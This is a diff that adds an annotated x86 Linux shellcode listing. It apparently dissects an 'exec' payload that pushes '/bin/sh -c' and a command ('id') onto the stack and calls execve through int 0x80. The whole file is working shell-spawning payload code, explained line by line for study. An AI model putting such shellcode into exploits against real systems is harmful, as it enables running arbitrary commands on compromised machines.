@@ -1,0 +1,17 @@
+; EXEC
+
+push byte 0xb ; push 11(execve syscall) on to the stack
+pop eax ; place 11 in eax
+cwd ; copies sign bit from AX to every bit in DX
+push edx ; push EDX to the stack
+push word 0x632d ; pushes “-c” on the stack
+mov edi, esp ; EDI is pointing to “-c”
+push dword 0x68732f ; next two instructions are pushing /bin/sh to stack
+push dword 0x6e69622f
+mov ebx, esp ; EBX is now pointing to “/bin/sh”
+push edx ; push zero
+call 0x1 ; these byte represents “id” and it will perform a call, doing that will result the esp containing “id” string
+push edi ; pushing “-c”
+push ebx ; push ebx  (/bin/sh)
+mov ecx, esp ; puts a pointer to the entire string “/bin/sh -c id” in ECX
+int 0x80 ; system interrupt to execute execve “/bin/sh -c [command]”
